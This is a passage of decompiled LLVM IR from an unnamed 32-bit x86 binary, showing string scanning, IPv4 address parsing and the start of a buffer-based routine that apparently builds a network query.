  %v0_8050b01 = load i32, i32* @ecx, align 4
  %v5_8050b04 = inttoptr i32 %v0_8050b04 to i8*
  %v8_8050b05 = call i32 @function_8051a8c(i8* %v5_8050b04, i32 %arg2, i32 %v0_8050b01, i32 %v0_8050b01)
  store i32 %v8_8050b05, i32* %eax.global-to-local, align 4
  %v0_8050b0d = load i32, i32* @ebx, align 4
  %v2_8050b0d = add i32 %v0_8050b0d, %v8_8050b05
  store i32 %v2_8050b0d, i32* @ebx, align 4
  %v1_8050b0f = inttoptr i32 %v2_8050b0d to i8*
  %v2_8050b0f = load i8, i8* %v1_8050b0f, align 1
  %v3_8050b0f = icmp eq i8 %v2_8050b0f, 0
  %v1_8050b12 = icmp eq i1 %v3_8050b0f, false
  br i1 %v1_8050b12, label %dec_label_pc_8050b1a, label %dec_label_pc_8050b14

dec_label_pc_8050b14:                             ; preds = %dec_label_pc_8050b01
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050b16 = load i32, i32* @esi, align 4
  %v2_8050b16 = inttoptr i32 %v1_8050b16 to i32*
  store i32 %v2_8050b0d, i32* %v2_8050b16, align 4
  %v0_8050b44.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b41

dec_label_pc_8050b1a:                             ; preds = %dec_label_pc_8050b01
  %v0_8050b1a = load i32, i32* @edx, align 4
  %v0_8050b1c = load i32, i32* @edi, align 4
  %v8_8050b1e = call i32 @function_8050b48(i8* %v1_8050b0f, i32 %v0_8050b1c, i32 %v0_8050b1a, i32 %v0_8050b1a)
  store i32 %v8_8050b1e, i32* %eax.global-to-local, align 4
  %v2_8050b26 = icmp eq i32 %v8_8050b1e, 0
  %v1_8050b28 = icmp eq i1 %v2_8050b26, false
  br i1 %v1_8050b28, label %dec_label_pc_8050b39, label %dec_label_pc_8050b2a

dec_label_pc_8050b2a:                             ; preds = %dec_label_pc_8050b1a
  %v0_8050b2e = load i32, i32* @ebx, align 4
  %v5_8050b2e = inttoptr i32 %v0_8050b2e to i8*
  %v8_8050b2f = call i32 @function_8051a28(i8* %v5_8050b2e, i32 0, i32 %v8_8050b1e, i32 %v8_8050b1e)
  br label %dec_label_pc_8050b3d

dec_label_pc_8050b39:                             ; preds = %dec_label_pc_8050b1a
  %v9_8050b1e = inttoptr i32 %v8_8050b1e to i8*
  store i8 0, i8* %v9_8050b1e, align 1
  %v2_8050b3c = add i32 %v8_8050b1e, 1
  br label %dec_label_pc_8050b3d

dec_label_pc_8050b3d:                             ; preds = %dec_label_pc_8050b2a, %dec_label_pc_8050b39
  %storemerge = phi i32 [ %v2_8050b3c, %dec_label_pc_8050b39 ], [ %v8_8050b2f, %dec_label_pc_8050b2a ]
  %v0_8050b3d = phi i32 [ %v2_8050b3c, %dec_label_pc_8050b39 ], [ %v8_8050b2f, %dec_label_pc_8050b2a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8050b3d = load i32, i32* @esi, align 4
  %v2_8050b3d = inttoptr i32 %v1_8050b3d to i32*
  store i32 %v0_8050b3d, i32* %v2_8050b3d, align 4
  %v0_8050b3f = load i32, i32* @ebx, align 4
  store i32 %v0_8050b3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b41

dec_label_pc_8050b41:                             ; preds = %dec_label_pc_8050b14, %dec_label_pc_8050b3d
  %v0_8050b44 = phi i32 [ %v0_8050b44.pre, %dec_label_pc_8050b14 ], [ %v0_8050b3f, %dec_label_pc_8050b3d ]
  ret i32 %v0_8050b44

; uselistorder directives
  uselistorder i32 %v8_8050b1e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050b41, { 1, 0 }
  uselistorder label %dec_label_pc_8050b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8050b01, { 1, 0 }
}

define i32 @function_8050b48(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b48:
  %v0_8050b49 = load i32, i32* @ebx, align 4
  %v2_8050b6026 = load i8, i8* %arg1, align 1
  %v4_8050b6230 = icmp eq i8 %v2_8050b6026, 0
  br i1 %v4_8050b6230, label %dec_label_pc_8050b6a, label %dec_label_pc_8050b66.lr.ph

dec_label_pc_8050b66.lr.ph:                       ; preds = %dec_label_pc_8050b48
  %v3_8050b6027 = zext i8 %v2_8050b6026 to i32
  %v5_8050b6028 = and i32 %v0_8050b49, -256
  %v6_8050b6029 = or i32 %v3_8050b6027, %v5_8050b6028
  %v4_8050b4e = ptrtoint i8* %arg1 to i32
  %v1_8050b5914 = inttoptr i32 %arg2 to i8*
  %v4_8050b59.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050b66

dec_label_pc_8050b54:                             ; preds = %dec_label_pc_8050b66, %dec_label_pc_8050b58
  %v6_8050b5924 = phi i32 [ %v6_8050b59, %dec_label_pc_8050b58 ], [ %v6_8050b5918, %dec_label_pc_8050b66 ]
  %v2_8050b5923 = phi i8 [ %v2_8050b59, %dec_label_pc_8050b58 ], [ %v2_8050b5915, %dec_label_pc_8050b66 ]
  %v0_8050b5822 = phi i32 [ %v1_8050b58, %dec_label_pc_8050b58 ], [ %arg2, %dec_label_pc_8050b66 ]
  %v15_8050b54 = icmp eq i8 %v2_8050b5923, %v2_8050b6034
  br i1 %v15_8050b54, label %dec_label_pc_8050b6c, label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b54
  %v1_8050b58 = add i32 %v0_8050b5822, 1
  %v1_8050b59 = inttoptr i32 %v1_8050b58 to i8*
  %v2_8050b59 = load i8, i8* %v1_8050b59, align 1
  %v3_8050b59 = zext i8 %v2_8050b59 to i32
  %v5_8050b59 = and i32 %v6_8050b5924, -256
  %v6_8050b59 = or i32 %v3_8050b59, %v5_8050b59
  %v4_8050b5b = icmp eq i8 %v2_8050b59, 0
  %v1_8050b5d = icmp eq i1 %v4_8050b5b, false
  br i1 %v1_8050b5d, label %dec_label_pc_8050b54, label %dec_label_pc_8050b5f

dec_label_pc_8050b5f:                             ; preds = %dec_label_pc_8050b58, %dec_label_pc_8050b66
  %v4_8050b59.pre37 = phi i32 [ %v6_8050b5918, %dec_label_pc_8050b66 ], [ %v6_8050b59, %dec_label_pc_8050b58 ]
  %v1_8050b5f = add i32 %v0_8050b5f32, 1
  %v1_8050b60 = inttoptr i32 %v1_8050b5f to i8*
  %v2_8050b60 = load i8, i8* %v1_8050b60, align 1
  %v3_8050b60 = zext i8 %v2_8050b60 to i32
  %v5_8050b60 = and i32 %v6_8050b6035, -256
  %v6_8050b60 = or i32 %v3_8050b60, %v5_8050b60
  %v4_8050b62 = icmp eq i8 %v2_8050b60, 0
  br i1 %v4_8050b62, label %dec_label_pc_8050b6a, label %dec_label_pc_8050b66

dec_label_pc_8050b66:                             ; preds = %dec_label_pc_8050b66.lr.ph, %dec_label_pc_8050b5f
  %v4_8050b59.pre = phi i32 [ %v4_8050b59.pre.pre, %dec_label_pc_8050b66.lr.ph ], [ %v4_8050b59.pre37, %dec_label_pc_8050b5f ]
  %v6_8050b6035 = phi i32 [ %v6_8050b6029, %dec_label_pc_8050b66.lr.ph ], [ %v6_8050b60, %dec_label_pc_8050b5f ]
  %v2_8050b6034 = phi i8 [ %v2_8050b6026, %dec_label_pc_8050b66.lr.ph ], [ %v2_8050b60, %dec_label_pc_8050b5f ]
  %v0_8050b5f32 = phi i32 [ %v4_8050b4e, %dec_label_pc_8050b66.lr.ph ], [ %v1_8050b5f, %dec_label_pc_8050b5f ]
  %v2_8050b5915 = load i8, i8* %v1_8050b5914, align 1
  %v3_8050b5916 = zext i8 %v2_8050b5915 to i32
  %v5_8050b5917 = and i32 %v4_8050b59.pre, -256
  %v6_8050b5918 = or i32 %v3_8050b5916, %v5_8050b5917
  %v4_8050b5b19 = icmp eq i8 %v2_8050b5915, 0
  %v1_8050b5d21 = icmp eq i1 %v4_8050b5b19, false
  br i1 %v1_8050b5d21, label %dec_label_pc_8050b54, label %dec_label_pc_8050b5f

dec_label_pc_8050b6a:                             ; preds = %dec_label_pc_8050b5f, %dec_label_pc_8050b48
  br label %dec_label_pc_8050b6c

dec_label_pc_8050b6c:                             ; preds = %dec_label_pc_8050b54, %dec_label_pc_8050b6a
  %v0_8050b6e = phi i32 [ 0, %dec_label_pc_8050b6a ], [ %v0_8050b5f32, %dec_label_pc_8050b54 ]
  store i32 %v0_8050b49, i32* @ebx, align 4
  ret i32 %v0_8050b6e

; uselistorder directives
  uselistorder i8 %v2_8050b5915, { 1, 2, 0 }
  uselistorder i32 %v1_8050b5f, { 1, 0 }
  uselistorder i32 %v6_8050b59, { 1, 0 }
  uselistorder i8 %v2_8050b59, { 1, 2, 0 }
  uselistorder i32 %v1_8050b58, { 1, 0 }
  uselistorder i8 %v2_8050b6026, { 0, 2, 1 }
  uselistorder i32 %v0_8050b49, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8050b66, { 1, 0 }
  uselistorder label %dec_label_pc_8050b5f, { 1, 0 }
}

define i32 @function_8050b70(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050b70:
  %v4_8050b77 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050b77, i32* @ecx, align 4
  %v1_8050b7b = icmp eq i8* %arg1, null
  br i1 %v1_8050b7b, label %dec_label_pc_8050bfc, label %dec_label_pc_8050b7f

dec_label_pc_8050b7f:                             ; preds = %dec_label_pc_8050b70
  %v0_8050b8a.pre = load i32, i32* @global_var_8056440, align 64
  br label %dec_label_pc_8050b8a

dec_label_pc_8050b8a:                             ; preds = %dec_label_pc_8050b7f, %dec_label_pc_8050bd3
  %v2_8050bd334 = phi i32 [ 1, %dec_label_pc_8050b7f ], [ %v3_8050bd3, %dec_label_pc_8050bd3 ]
  %v0_8050b9033 = phi i32 [ %v4_8050b77, %dec_label_pc_8050b7f ], [ %v0_8050b903, %dec_label_pc_8050bd3 ]
  %v0_8050bf132 = phi i32 [ 0, %dec_label_pc_8050b7f ], [ %v2_8050bd9, %dec_label_pc_8050bd3 ]
  %v1_8050b90 = inttoptr i32 %v0_8050b9033 to i8*
  %v2_8050b90 = load i8, i8* %v1_8050b90, align 1
  %v3_8050b90 = sext i8 %v2_8050b90 to i32
  %v2_8050b93 = mul nsw i32 %v3_8050b90, 2
  %v3_8050b93 = add i32 %v2_8050b93, %v0_8050b8a.pre
  %v4_8050b93 = inttoptr i32 %v3_8050b93 to i8*
  %v5_8050b93 = load i8, i8* %v4_8050b93, align 1
  %v6_8050b93 = and i8 %v5_8050b93, 8
  %v7_8050b93 = icmp eq i8 %v6_8050b93, 0
  br i1 %v7_8050b93, label %dec_label_pc_8050bfc, label %dec_label_pc_8050b9a

dec_label_pc_8050b9a:                             ; preds = %dec_label_pc_8050b8a
  %v4_8050bae.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050bae

dec_label_pc_8050b9e:                             ; preds = %dec_label_pc_8050bae
  %v3_8050b9e = mul i32 %v1_8050b9e, 10
  %v2_8050ba1 = add i32 %v3_8050b9e, -48
  %v3_8050ba1 = add i32 %v2_8050ba1, %v2_8050bb0
  %v1_8050ba5 = add i32 %v3_8050ba1, -255
  %v6_8050ba5 = sub i32 254, %v3_8050ba1
  %v7_8050ba5 = and i32 %v6_8050ba5, %v3_8050ba1
  %v8_8050ba5 = icmp slt i32 %v7_8050ba5, 0
  %v9_8050ba5 = icmp eq i32 %v1_8050ba5, 0
  %v10_8050ba5 = icmp slt i32 %v1_8050ba5, 0
  %v3_8050bab = icmp eq i1 %v10_8050ba5, %v8_8050ba5
  %v4_8050bab = icmp eq i1 %v9_8050ba5, false
  %v5_8050bab = and i1 %v4_8050bab, %v3_8050bab
  br i1 %v5_8050bab, label %dec_label_pc_8050bfc, label %dec_label_pc_8050bad

dec_label_pc_8050bad:                             ; preds = %dec_label_pc_8050b9e
  %v1_8050bad = add i32 %v0_8050bad, 1
  store i32 %v1_8050bad, i32* @ecx, align 4
  br label %dec_label_pc_8050bae

dec_label_pc_8050bae:                             ; preds = %dec_label_pc_8050b9a, %dec_label_pc_8050bad
  %v1_8050b9e = phi i32 [ 0, %dec_label_pc_8050b9a ], [ %v3_8050ba1, %dec_label_pc_8050bad ]
  %v4_8050bae = phi i32 [ %v4_8050bae.pre, %dec_label_pc_8050b9a ], [ %v6_8050bae, %dec_label_pc_8050bad ]
  %v0_8050bad = phi i32 [ %v0_8050b9033, %dec_label_pc_8050b9a ], [ %v1_8050bad, %dec_label_pc_8050bad ]
  %v1_8050bae = inttoptr i32 %v0_8050bad to i8*
  %v2_8050bae = load i8, i8* %v1_8050bae, align 1
  %v3_8050bae = zext i8 %v2_8050bae to i32
  %v5_8050bae = and i32 %v4_8050bae, -256
  %v6_8050bae = or i32 %v3_8050bae, %v5_8050bae
  store i32 %v6_8050bae, i32* @edx, align 4
  %v2_8050bb0 = sext i8 %v2_8050bae to i32
  %v2_8050bb3 = mul nsw i32 %v2_8050bb0, 2
  %v3_8050bb3 = add i32 %v2_8050bb3, %v0_8050b8a.pre
  %v4_8050bb3 = inttoptr i32 %v3_8050bb3 to i16*
  %v5_8050bb3 = load i16, i16* %v4_8050bb3, align 2
  %v2_8050bb8 = and i16 %v5_8050bb3, 8
  %v3_8050bb8 = icmp eq i16 %v2_8050bb8, 0
  %v1_8050bba = icmp eq i1 %v3_8050bb8, false
  br i1 %v1_8050bba, label %dec_label_pc_8050b9e, label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050bae
  %v8_8050bbc = sub nsw i32 2, %v2_8050bd334
  %v9_8050bbc = and i32 %v8_8050bbc, %v2_8050bd334
  %v10_8050bbc = icmp slt i32 %v9_8050bbc, 0
  %v11_8050bbc = icmp eq i32 %v2_8050bd334, 3
  %v12_8050bbc = icmp slt i32 %v2_8050bd334, 3
  %v3_8050bc0 = icmp eq i1 %v12_8050bbc, %v10_8050bbc
  %v4_8050bc0 = icmp eq i1 %v11_8050bbc, false
  %v5_8050bc0 = and i1 %v4_8050bc0, %v3_8050bc0
  br i1 %v5_8050bc0, label %dec_label_pc_8050bca, label %dec_label_pc_8050bc2

dec_label_pc_8050bc2:                             ; preds = %dec_label_pc_8050bbc
  %v10_8050bc2 = icmp eq i8 %v2_8050bae, 46
  %v1_8050bc5 = icmp eq i1 %v10_8050bc2, false
  br i1 %v1_8050bc5, label %dec_label_pc_8050bfc, label %dec_label_pc_8050bc7

dec_label_pc_8050bc7:                             ; preds = %dec_label_pc_8050bc2
  %v1_8050bc7 = add i32 %v0_8050bad, 1
  store i32 %v1_8050bc7, i32* @ecx, align 4
  br label %dec_label_pc_8050bd3

dec_label_pc_8050bca:                             ; preds = %dec_label_pc_8050bbc
  %v1_8050bca = add i32 %v0_8050bad, 1
  store i32 %v1_8050bca, i32* @ecx, align 4
  %v4_8050bcb = icmp eq i8 %v2_8050bae, 0
  br i1 %v4_8050bcb, label %dec_label_pc_8050bd3, label %dec_label_pc_8050bcf

dec_label_pc_8050bcf:                             ; preds = %dec_label_pc_8050bca
  %v2_8050bcf = and i16 %v5_8050bb3, 32
  %v3_8050bcf = icmp eq i16 %v2_8050bcf, 0
  br i1 %v3_8050bcf, label %dec_label_pc_8050bfc, label %dec_label_pc_8050bd3

dec_label_pc_8050bd3:                             ; preds = %dec_label_pc_8050bcf, %dec_label_pc_8050bca, %dec_label_pc_8050bc7
  %v0_8050b903 = phi i32 [ %v1_8050bca, %dec_label_pc_8050bcf ], [ %v1_8050bca, %dec_label_pc_8050bca ], [ %v1_8050bc7, %dec_label_pc_8050bc7 ]
  %v3_8050bd3 = add nuw nsw i32 %v2_8050bd334, 1
  %v2_8050bd6 = mul i32 %v0_8050bf132, 256
  %v2_8050bd9 = or i32 %v1_8050b9e, %v2_8050bd6
  %v7_8050bdf = icmp sgt i32 %v2_8050bd334, 3
  br i1 %v7_8050bdf, label %dec_label_pc_8050be1, label %dec_label_pc_8050b8a

dec_label_pc_8050be1:                             ; preds = %dec_label_pc_8050bd3
  %v4_8050be1 = icmp eq i32 %arg2, 0
  br i1 %v4_8050be1, label %dec_label_pc_8050bfe, label %dec_label_pc_8050bed

dec_label_pc_8050bed:                             ; preds = %dec_label_pc_8050be1
  %v1_8050bf1 = call i32 @llvm.bswap.i32(i32 %v2_8050bd9)
  %v2_8050bf3 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8050bf1, i32* %v2_8050bf3, align 4
  br label %dec_label_pc_8050bfe

dec_label_pc_8050bfc:                             ; preds = %dec_label_pc_8050bcf, %dec_label_pc_8050bc2, %dec_label_pc_8050b8a, %dec_label_pc_8050b9e, %dec_label_pc_8050b70
  br label %dec_label_pc_8050bfe

dec_label_pc_8050bfe:                             ; preds = %dec_label_pc_8050be1, %dec_label_pc_8050bed, %dec_label_pc_8050bfc
  %v0_8050c03 = phi i32 [ 1, %dec_label_pc_8050be1 ], [ 1, %dec_label_pc_8050bed ], [ 0, %dec_label_pc_8050bfc ]
  ret i32 %v0_8050c03

; uselistorder directives
  uselistorder i32 %v2_8050bb0, { 1, 0 }
  uselistorder i32 %v6_8050bae, { 1, 0 }
  uselistorder i8 %v2_8050bae, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050bad, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050ba5, { 1, 0 }
  uselistorder i32 %v3_8050ba1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8050b9033, { 1, 0 }
  uselistorder i32 %v2_8050bd334, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050bfe, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050bfc, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8050bae, { 1, 0 }
  uselistorder label %dec_label_pc_8050b8a, { 1, 0 }
}

define i32 @function_8050c04(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8050c04:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_8050c1a = call i32 @function_804ddba(i32 512)
  store i32 %v1_8050c1a, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_8050c1a, i32* @ebp, align 4
  %v1_8050c28 = call i32 @function_804ddba(i32 1025)
  store i32 %v1_8050c28, i32* %eax.global-to-local, align 4
  %v12_8050c31 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8050c34 = icmp eq i32 %v1_8050c1a, 0
  br i1 %v1_8050c34, label %dec_label_pc_80512ad, label %dec_label_pc_8050c3c

dec_label_pc_8050c3c:                             ; preds = %dec_label_pc_8050c04
  %v1_8050c3c = icmp eq i32 %v1_8050c28, 0
  br i1 %v1_8050c3c, label %dec_label_pc_80512ad, label %dec_label_pc_8050c44

dec_label_pc_8050c44:                             ; preds = %dec_label_pc_8050c3c
  %v5_8050c44 = icmp eq i32 %arg2, 0
  br i1 %v5_8050c44, label %dec_label_pc_80512ad, label %dec_label_pc_8050c52

dec_label_pc_8050c52:                             ; preds = %dec_label_pc_8050c44
  %v4_8050c52 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050c52, i32* %eax.global-to-local, align 4
  %v2_8050c59 = load i8, i8* %arg1, align 1
  %v3_8050c59 = icmp eq i8 %v2_8050c59, 0
  br i1 %v3_8050c59, label %dec_label_pc_80512ad, label %dec_label_pc_8050c62

dec_label_pc_8050c62:                             ; preds = %dec_label_pc_8050c52
  store i32 %v4_8050c52, i32* %stack_var_-252, align 4
  %v2_8050c66 = call i32 @function_804d514(i8* nonnull %arg1)
  store i32 %v2_8050c66, i32* @eax, align 4
  store i32 %v4_8050c52, i32* %edx.global-to-local, align 4
  %v2_8050c89 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8050c89, i32* @ebx, align 4
  store i32 %v2_8050c89, i32* %stack_var_-252, align 4
  %v2_8050c91 = call i32 @function_804f65e(i32 %v2_8050c89, i32 134542939)
  store i32 %v2_8050c91, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058b28.194 to i32), i32* %stack_var_-252, align 4
  %v1_8050c9d = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8058b28.194 to i32))
  %v0_8050ca2 = load i64, i64* @global_var_8058b40.195, align 8
  %v1_8050ca2 = trunc i64 %v0_8050ca2 to i32
  %v1_8050ca7 = ashr i32 %v1_8050ca2, 31
  %v6_8050ca8 = and i64 %v0_8050ca2, 4294967295
  %v8_8050ca8 = zext i32 %v1_8050ca7 to i64
  %v9_8050ca8 = mul nuw i64 %v8_8050ca8, 4294967296
  %v10_8050ca8 = or i64 %v9_8050ca8, %v6_8050ca8
  %v14_8050ca8 = srem i64 %v10_8050ca8, %tmp33
  %v15_8050ca8 = trunc i64 %v14_8050ca8 to i32
  %v0_8050caf = load i16, i16* @global_var_805644c.196, align 4
  %v2_8050cbe = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_8050cbe, i32* @eax, align 4
  store i32 134542939, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c89, i32* %stack_var_-252, align 4
  %v2_8050cc3 = call i32 @function_804f65e(i32 %v2_8050c89, i32 1)
  store i32 %v2_8050cc3, i32* %eax.global-to-local, align 4
  %v4_8050e6a = inttoptr i32 %v15_8050ca8 to i8*
  %v1_805128886 = add i32 %v12_8050c31, 28
  %v2_805128887 = inttoptr i32 %v1_805128886 to i32*
  %v3_805128888 = load i32, i32* %v2_805128887, align 4
  %tmp = icmp ult i32 %v3_805128888, 3
  br i1 %tmp, label %dec_label_pc_8050ce8, label %dec_label_pc_80512ad

dec_label_pc_8050ce8:                             ; preds = %dec_label_pc_8050c62, %dec_label_pc_8051288.backedge
  %v0_8050cef94 = phi i32 [ %v0_8051288.pre, %dec_label_pc_8051288.backedge ], [ %v12_8050c31, %dec_label_pc_8050c62 ]
  %v1_8050ce8 = add i32 %v0_8050cef94, 20
  %v2_8050ce8 = inttoptr i32 %v1_8050ce8 to i32*
  %v3_8050ce8 = load i32, i32* %v2_8050ce8, align 4
  %v13_8050ce8 = icmp eq i32 %v3_8050ce8, -1
  br i1 %v13_8050ce8, label %dec_label_pc_8050ce8.dec_label_pc_8050cfe_crit_edge, label %dec_label_pc_8050cef

dec_label_pc_8050ce8.dec_label_pc_8050cfe_crit_edge: ; preds = %dec_label_pc_8050ce8
  %v0_8050cfe.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cfe

dec_label_pc_8050cef:                             ; preds = %dec_label_pc_8050ce8
  %v3_8050cf2 = load i32, i32* %v2_8050ce8, align 4
  %v5_8050cf2 = add i32 %v0_8050cef94, -16
  %v6_8050cf2 = inttoptr i32 %v5_8050cf2 to i32*
  store i32 %v3_8050cf2, i32* %v6_8050cf2, align 4
  %v1_8050cf6 = call i32 @function_804b7d8(i32 -1)
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  %v0_8050cfb = load i32, i32* @esp, align 4
  %v1_8050cfb = add i32 %v0_8050cfb, 16
  br label %dec_label_pc_8050cfe

dec_label_pc_8050cfe:                             ; preds = %dec_label_pc_8050ce8.dec_label_pc_8050cfe_crit_edge, %dec_label_pc_8050cef
  %v1_8050cfe = phi i32 [ %v0_8050cef94, %dec_label_pc_8050ce8.dec_label_pc_8050cfe_crit_edge ], [ %v1_8050cfb, %dec_label_pc_8050cef ]
  %v0_8050cfe = phi i32 [ %v0_8050cfe.pre, %dec_label_pc_8050ce8.dec_label_pc_8050cfe_crit_edge ], [ %v1_8050cf6, %dec_label_pc_8050cef ]
  %v2_8050cfe = add i32 %v1_8050cfe, -4
  %v3_8050cfe = inttoptr i32 %v2_8050cfe to i32*
  store i32 %v0_8050cfe, i32* %v3_8050cfe, align 4
  %v1_8050cff = add i32 %v1_8050cfe, -8
  %v2_8050cff = inttoptr i32 %v1_8050cff to i32*
  store i32 512, i32* %v2_8050cff, align 4
  %v1_8050d04 = add i32 %v1_8050cfe, -12
  %v2_8050d04 = inttoptr i32 %v1_8050d04 to i32*
  store i32 0, i32* %v2_8050d04, align 4
  %v2_8050d06 = add i32 %v1_8050cfe, -16
  %v3_8050d06 = inttoptr i32 %v2_8050d06 to i32*
  store i32 %v1_8050c1a, i32* %v3_8050d06, align 4
  %v4_8050d07 = call i32 @function_804d4e0(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050d07, i32* %eax.global-to-local, align 4
  %v0_8050d0c = load i32, i32* @esp, align 4
  %v1_8050d0f = add i32 %v0_8050d0c, 8
  %v2_8050d0f = inttoptr i32 %v1_8050d0f to i32*
  store i32 48, i32* %v2_8050d0f, align 4
  %v1_8050d11 = add i32 %v0_8050d0c, 4
  %v2_8050d11 = inttoptr i32 %v1_8050d11 to i32*
  store i32 0, i32* %v2_8050d11, align 4
  %v1_8050d13 = add i32 %v0_8050d0c, 84
  store i32 %v1_8050d13, i32* @ebx, align 4
  %v3_8050d17 = inttoptr i32 %v0_8050d0c to i32*
  store i32 %v1_8050d13, i32* %v3_8050d17, align 4
  %v4_8050d18 = call i32 @function_804d4e0(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050d18, i32* %eax.global-to-local, align 4
  %v0_8050d1d = load i32, i32* @esp, align 4
  %v1_8050d1d = add i32 %v0_8050d1d, 72
  %v2_8050d1d = inttoptr i32 %v1_8050d1d to i32*
  %v3_8050d1d = load i32, i32* %v2_8050d1d, align 4
  store i32 %v3_8050d1d, i32* %eax.global-to-local, align 4
  %v1_8050d21 = add i32 %v0_8050d1d, 116
  %v2_8050d21 = inttoptr i32 %v1_8050d21 to i32*
  store i32 1, i32* %v2_8050d21, align 4
  %v0_8050d29 = load i32, i32* @esp, align 4
  %v1_8050d29 = add i32 %v0_8050d29, 104
  %v2_8050d29 = inttoptr i32 %v1_8050d29 to i32*
  store i32 1, i32* %v2_8050d29, align 4
  %v0_8050d31 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d31 = add i32 %v0_8050d31, 1
  %v1_8050d32 = urem i32 %v1_8050d31, 65536
  store i32 %v1_8050d32, i32* %eax.global-to-local, align 4
  %v1_8050d37 = load i32, i32* @esp, align 4
  %v2_8050d37 = add i32 %v1_8050d37, 72
  %v3_8050d37 = inttoptr i32 %v2_8050d37 to i32*
  store i32 %v1_8050d32, i32* %v3_8050d37, align 4
  %v0_8050d3b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d3b = load i32, i32* @esp, align 4
  %v2_8050d3b = add i32 %v1_8050d3b, 84
  %v3_8050d3b = inttoptr i32 %v2_8050d3b to i32*
  store i32 %v0_8050d3b, i32* %v3_8050d3b, align 4
  %v0_8050d3f = load i32, i32* @esp, align 4
  %v1_8050d42 = add i32 %v0_8050d3f, 8
  %v2_8050d42 = inttoptr i32 %v1_8050d42 to i32*
  store i32 512, i32* %v2_8050d42, align 4
  %v2_8050d47 = add i32 %v0_8050d3f, 4
  %v3_8050d47 = inttoptr i32 %v2_8050d47 to i32*
  store i32 %v1_8050c1a, i32* %v3_8050d47, align 4
  %v0_8050d48 = load i32, i32* @ebx, align 4
  %v3_8050d48 = inttoptr i32 %v0_8050d3f to i32*
  store i32 %v0_8050d48, i32* %v3_8050d48, align 4
  %v0_8050d49 = call i32 @function_8051ff4()
  store i32 %v0_8050d49, i32* %eax.global-to-local, align 4
  %v0_8050d4e = load i32, i32* @esp, align 4
  %v2_8050d51 = icmp slt i32 %v0_8050d49, 0
  store i32 %v0_8050d49, i32* @ebx, align 4
  br i1 %v2_8050d51, label %dec_label_pc_80512ad, label %dec_label_pc_8050d5b

dec_label_pc_8050d5b:                             ; preds = %dec_label_pc_8050cfe
  %v2_8050d5b = add i32 %v0_8050d4e, 12
  %v3_8050d5b = inttoptr i32 %v2_8050d5b to i32*
  store i32 %v0_8050d49, i32* %v3_8050d5b, align 4
  %v1_8050d5c = add i32 %v0_8050d4e, 8
  %v2_8050d5c = inttoptr i32 %v1_8050d5c to i32*
  store i32 1025, i32* %v2_8050d5c, align 4
  %v1_8050d61 = add i32 %v0_8050d4e, 256
  %v2_8050d61 = inttoptr i32 %v1_8050d61 to i32*
  %v3_8050d61 = load i32, i32* %v2_8050d61, align 4
  %v5_8050d61 = add i32 %v0_8050d4e, 4
  %v6_8050d61 = inttoptr i32 %v5_8050d61 to i32*
  store i32 %v3_8050d61, i32* %v6_8050d61, align 4
  %v1_8050d68 = add i32 %v0_8050d4e, 28
  %v2_8050d68 = inttoptr i32 %v1_8050d68 to i32*
  %v3_8050d68 = load i32, i32* %v2_8050d68, align 4
  %v6_8050d68 = inttoptr i32 %v0_8050d4e to i32*
  store i32 %v3_8050d68, i32* %v6_8050d68, align 4
  %v4_8050d6c = call i32 @function_804d528(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  %v0_8050d71 = load i32, i32* @esp, align 4
